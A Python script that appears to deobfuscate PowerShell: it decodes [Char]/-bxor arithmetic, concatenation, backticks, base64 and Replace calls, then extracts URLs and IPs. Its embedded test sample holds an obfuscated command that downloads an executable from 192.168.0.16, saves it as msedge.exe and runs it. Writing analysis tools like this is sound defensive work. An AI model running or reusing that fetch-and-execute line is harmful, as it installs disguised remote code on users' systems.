import re
import base64
from urllib.parse import unquote

chrregex = re.compile(r'Chr\(([-]?\d+)(\s+(\^|\+|\-|\/|\*|\%)\s+(\d+))*\)', re.IGNORECASE)
stringregex = re.compile(r'(".*?"|\'.*?.\')')

concatregex = re.compile(r'({chr})(\s*\+\s*({chr}))*'.format(chr=chrregex.pattern, string=stringregex.pattern))

def remove_spaces_bracket(match):
    return f"[Char]({match.group(1)}{match.group(2)}{match.group(3)})"

def remove_string(code):
    pattern = re.compile(r'\[string\]', re.IGNORECASE)
    newcode = []
    for line in code.strip().splitlines():
        newcoderes = pattern.sub('', line).strip()
        newcode.append(newcoderes)
    return "\n".join(newcode)

def char_intended(code):
    code = re.compile(r'\[Char\]\s+\(([-\d\+\*/\^]+)\)', re.IGNORECASE).sub(r'[Char](\1)', code)
    resultnumber = re.compile(r'\[Char\]\s+(\d+)', re.IGNORECASE).sub(r'[Char]\1', code)
    resultexpr = re.compile(r'\[Char\]\s*\(\s*(-?\d+)\s*([+\-*/])\s*(-?\d+)\s*\)', re.IGNORECASE).sub(remove_spaces_bracket, resultnumber)
    resultbxor = re.compile(r'\s*(-?\d+)\s*-\s*bxor\s*(-?\d+)\s*', re.IGNORECASE).sub(r'\1 -bxor \2', resultexpr)
    resultplus = re.compile(r'(\[Char\]\(\d+[+\-*/]\d+\))\s*\+\s*', re.IGNORECASE).sub(r'\1 + ', resultbxor)
    final_result = re.compile(r'(\[Char\]\([^\)]+\))\s*\+\s*(\[Char\]\([^\)]+\))', re.IGNORECASE).sub(r'\1 + \2', resultplus)
    return final_result

def replace_match(match):
    res = match.group(1)
    matchsymbol = re.sub(r'(?<=\d)([\+\*/\^])(?=\d)', r' \1 ', res)
    minussymbol = re.sub(r'(?<=\d)-(?=\d)', r' - ', matchsymbol)
    changebxor = minussymbol.replace('-bxor', '^')
    final_result = re.sub(r'^\((.*)\)$', r'\1', changebxor)
    return f'Chr({final_result})'

def char_transform(code):
    return re.compile(r'\[char\]\(([-\d\+\*/\^\s]+(?:\s?-bxor\s?[-\d\+\*/\^\s]+)?)\)|\[Char\]([-0-9]+)', re.IGNORECASE).sub(replace_match, code)
 
def decode_chr(expr):
    numbers = list(map(int, re.findall(r'-?\d+', expr)))
    simbol = re.compile(r'[-]?\d+\s*(\^|\+|\-|\/|\*|\%|\^)', re.IGNORECASE).findall(expr)
    result = numbers[0]
    for i in range(len(simbol)):
        if simbol[i] == '+':
            result += numbers[i+1]
        elif simbol[i] == '-':
            result -= numbers[i+1]
        elif simbol[i] == '*':
            result *= numbers[i+1]
        elif simbol[i] == '/':
            result //= numbers[i+1]
        elif simbol[i] == '%':
            result %= numbers[i+1]
        elif simbol[i] == '^':
            result ^= numbers[i+1]
    return chr(result)

def validate_input(input_string):
    input_string = input_string.strip()
    while re.search(r'(\w)\s*\+\s*(\w)', input_string):
        input_string = re.sub(r'(\w)\s*\+\s*(\w)', r'\1\2', input_string)
    input_string = re.sub(r'\s*\+\s*', '', input_string)
    return input_string

def check_concat_plus(symbol):
    chr_pattern = re.compile(r'chr\([^()]*\)', re.IGNORECASE)
    chr_substrings = chr_pattern.findall(symbol)
    temp_string = chr_pattern.sub("temp", symbol)
    
    temp_string = validate_input(temp_string)
    
    for chr_substring in chr_substrings:
        temp_string = temp_string.replace("temp", chr_substring, 1)
    return ' ' + temp_string


def concat_code(code):
    concatregex = re.compile(r'(Chr\([^()]*\)|".*?")(\s*\+\s*(Chr\([^()]*\)|".*?"))*', re.IGNORECASE)
    
    matches = concatregex.finditer(code)
    results = []
    for match in matches:
        results.append(match.group(1))
        remaining_text = match.group(0)[len(match.group(1)):].strip()
        while remaining_text:
            next_match = re.match(r'\s*\+\s*(Chr\([^()]*\)|".*?")', remaining_text, re.IGNORECASE)
            if next_match:
                results.append(next_match.group(1))
                remaining_text = remaining_text[next_match.end():].strip()
            else:
                break
    gabungin = [decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results]
    splitslashn = [splitslash for splitslash in code.strip().splitlines()]
    check = []
    for i in splitslashn:
        check.append(i + '\n')
    newcoderes = []
    for i in range(len(check)):
        check[i] = check[i].replace('"', "").replace("'", "")
        if "+=" in check[i]:
            parts = [part.lstrip(' ') for part in check[i].split('+=')]
            if "+" in parts[1] and not re.search(r'\$\w+', parts[1]):
                newparts = check_concat_plus(parts[1])
            else:
                newparts = parts[1]
            check[i] = parts[0] + "+=" + ' ' + newparts + "\n"
            newcoderes.append(check[i])
        elif "=" in check[i]:
            valid = 0
            parts = [part.lstrip(' ') for part in check[i].split('=')]  
            for j in range(len(parts)):
                if "+" in parts[j] and re.search(r'\$\w+', parts[j]):
                    newcoderes.append(check[i])
                    valid = 1
                    break
            if valid == 0:
                pluscount = 0
                res = ''
                for i in range(len(parts)):
                    if '+' in parts[i]:
                        newparts = check_concat_plus(parts[i])
                        pluscount = 1
                    else:
                        newparts = parts[i]
                    if pluscount == 0 and i == len(parts) - 1:
                        res += ' '
                    if i == len(parts) - 1:
                        res += newparts + '\n'
                    else:
                        res += newparts + '='
                newcoderes.append(res)
        else:
            if '+' in check[i]:
                check[i] = check_concat_plus(check[i])
            if '\n' not in check[i]:
                check[i] += '\n'
            newcoderes.append(check[i])
    newcode = ''.join([i for i in newcoderes])
    for i, element in enumerate(gabungin):
        if len(element) == 1:
            newcode = newcode.replace(results[i], element)
    return newcode


def backtick(code):
    backtick_dict = {
        '`b': '\b',
        '`f': '\f',
        '`n': '\n',
        '`r': '\r',
        '`t': '\t',
        '`v': '\v'
    }
    checkcode = code.split('\n')
    for i in range(len(checkcode)):
        for backtick, backtickvalue in backtick_dict.items():
            if backtick in checkcode[i]:
                checkcode[i] = checkcode[i].replace(backtick,backtickvalue)
        if not checkcode[i].endswith('\n'):
            checkcode[i] += '\n'
    newcode = ''.join([i for i in checkcode])
    return newcode.strip()


def combine_and_concat_multiple_variables_value(code):
    value_dict = {}
    notvariablevalue = []
    equalmorethan1pattern = r'={2,}'
    
    def replace_equal_more_than_1(match):
        return '%3D' * len(match.group(0))
    
    checkcode = [check for check in code.splitlines() if check != '']

    for i in range(len(checkcode)):
        checkcode[i] = re.sub(equalmorethan1pattern, replace_equal_more_than_1, checkcode[i])
        if "+=" in checkcode[i]:
            parts = checkcode[i].split('+=')
            var = parts[0].strip()
            value = parts[1].strip() 
            value_dict[var] = value_dict.get(var, "") + value
        elif "=" in checkcode[i] and "!=" not in checkcode[i]:
            split_equal = checkcode[i].split('=')
            for i in range(len(split_equal)-1, 0, -1):
                var = split_equal[i-1].strip().split()[-1]
                value = split_equal[i].strip().split('=')[0].strip()
                value_dict[var] = value
        else:
            notvariablevalue.append(checkcode[i])

    for var, value in list(value_dict.items()):
        vars = []
        while value in value_dict and value not in vars:
            vars.append(value)
            value = value_dict[value]
        for v in vars:
            value_dict[v] = value
        value_dict[var] = value

    for var, value in value_dict.items():
        newvaluetemp = ""
        for match in re.split(r'(\$?\w+)', value):
            if match in value_dict:
                newvaluetemp += value_dict[match]
            else:
                newvaluetemp += match
        value_dict[var] = newvaluetemp

    reverse_value_dict = {}
    for var, value in value_dict.items():
        if value in reverse_value_dict:
            reverse_value_dict[value].append(var)
        else:
            reverse_value_dict[value] = [var]

    codetemp = []
    for value, vars in reverse_value_dict.items():
        if len(vars) > 1:
            codetemp.append(" = ".join(vars) + f" = {value}")
        else:
            codetemp.append(f"{vars[0]} = {value}")
    newcodetemp = []
    j,k = 0, 0
    for i in range(len(checkcode)):
        if k != len(notvariablevalue) and checkcode[i] == notvariablevalue[k]:
            newcodetemp.append(notvariablevalue[k])
            k += 1
        elif j != len(codetemp):
            newcodetemp.append(codetemp[j])
            j += 1
        elif j == len(codetemp):
            if k == len(notvariablevalue):
                break
            newcodetemp.append(notvariablevalue[k])
            k += 1

    variables = {}
    for line in newcodetemp:
        match = re.match(r'^(\$\w+(?:\s*=\s*\$\w+)*\s*)=\s*(.+)', line)
        if match:
            value = match.group(2).strip()
            vars = [v.strip() for v in match.group(1).split('=')]
            prev_var = value
            for var in vars:
                variables[var] = prev_var
                prev_var = var
    def replace_var(match):
        var = match.group(0)
        while var in variables:
            var = variables[var]
        return var
    
    newcode = []
    for line in newcodetemp:
        if not line.strip().startswith('$'):
            line = re.sub(r'\$\w+', replace_var, line)
        newcode.append(line)

    newcodewithslashn = []
    for i in newcode:
        newcodewithslashn.append(i + '\n')
    newcoderes = []
    for i in newcodewithslashn:
        parts = i.split('=')
        res = ''
        for j in parts:
            if '+' in j:
                check = check_concat_plus(j)
                if parts.index(j) == len(parts) - 1:
                    check += '\n'
            else:
                check = j
            res += check
            if "\n" not in j:
                res += "="
        newcoderes.append(res)
    newcoderes[-1] = newcoderes[-1].strip('\n')
    newcode = ''.join([i for i in newcoderes])
    return newcode

def decoding(code):
    checkcode = code.split('\n')
    newcoderes = []
    for i in checkcode:
        if i == '':
            continue
        matchb64 = re.search(r'(?i)([A-Za-z0-9]+%3D%3D)', i)
        if matchb64:
            try:
                encoded = unquote(matchb64.group(0))
                decoded = base64.b64decode(encoded).decode()
                matchb64part2 = re.search(r"(?i)\[(.*?\)+)|(b64|base64).*?%3D%3D", i)
                if matchb64part2:
                    newcoderes.append(i.replace(matchb64part2.group(0), decoded))
                else:
                    newcoderes.append(i.replace(matchb64.group(0), decoded))
            except:
                newcoderes.append(i)
        else:
            newcoderes.append(i)
    newcode = ''.join([i + '\n' for i in newcoderes])
    return newcode.strip()

def Replace(code):
    def replace_func(match):
        string, oldword, newword = match.groups()
        return string.replace(oldword.strip(), newword.strip())
    
    checkcode = code.split('\n')
    for i in range(len(checkcode)):
        while True:
            newcode, count = re.subn(r"(\w+)\.rePLAce\(([^,]+),([^)]+)\)", replace_func, checkcode[i], flags=re.IGNORECASE)
            if count == 0:
                break
            checkcode[i] = newcode
    newcode = ''.join([i + '\n' for i in checkcode])
    return newcode.strip()


def http_and_ip_grep(code):    
    httplist = re.findall(r'https?://[^\s]+', code)
    iplist = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?::[0-9]{1,5})?\b', code)
    
    return httplist, iplist

def deobfuscate(code):
    try:
        code = remove_string(code)
        code = char_intended(code)
        code = char_transform(code)
        codetemp = []
        checkcode = code.split('\n')
        for i in range(len(checkcode)):
            checkcode[i] += "\n"
            if ';' in checkcode[i]:
                parts = [part.lstrip(' ') for part in checkcode[i].split(';')]
                if parts[-1] == '\n':
                    parts = parts[:-1]
                if len(parts) == 1:
                    codetemp.append(parts[0] + '\n')
                    continue
                for j in parts:
                    if parts.index(j) == len(parts) - 1:
                        codetemp.append(j)
                    else:
                        codetemp.append(j + '\n')
            else:
                codetemp.append(checkcode[i])
        code = ''.join([i if i != codetemp[-1] else i.rstrip('\n') for i in codetemp])
        code = concat_code(code)
        code = backtick(code)
        code = combine_and_concat_multiple_variables_value(code)
        code = decoding(code)
        code = Replace(code)
        httplist,iplist = http_and_ip_grep(code)
    except:
        code = "Something's wrong with the code or input!"
    return code,httplist,iplist

testing = """"
$tes = [StRing][Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13);
$tes2 += [ChaR](98   -  10  - 10 + 1) + [CHAR](109 -bxor   4);
$tes2 = [StRing][ChaR](99   -  10  - 10 + 1)         +          [CHAR](109 -bxor   4);
$tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4);
$tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)';
$tes6 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4);
$tes7 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
$tesss = pe
$tesss += [ChaR](100   -  10  - 10 + 1) + [CHAR](109 -bxor   4) + $tes7 + a
$tes8 = $tesss + [CHAR](109 -bxor   3)
$s10 = $tesss + [CHAR](109 -bxor   3)
$a = FromBase64STrinG
$b = SGVsbG8gd29ybGQh==
$decodedBytes = [System.Convert]::$a(($b))
$tes9 = [CHAr](109 + 2) + $tes + '`b`b' + [CHAR](109 -bxor   5) + `naaaa
$aa = "ayam goreng enak loh"
$bb = a + $aa
$u=$v='ht'+'tp://192.168.0.16:8282/warrB64_deC'    +   'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3Dwarrr/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{};$abbbb    =     $decodedBytes 
aGFsbyBnZXMgd2VsY29tZSB0byB5b3V0dWJlIGNoYW5uZWwgbXk==
$bb += $tes2.rePLAce('Pi','Pia Baturiti')
$cc = $tes.rePLAce('FY','GX').replace('m','aa ').REPLaCE('aa ','default')
"""

code,httplist,iplist = deobfuscate(testing)
print(code)


#TO-DO: pelajarin decode lainnya, pola backslash

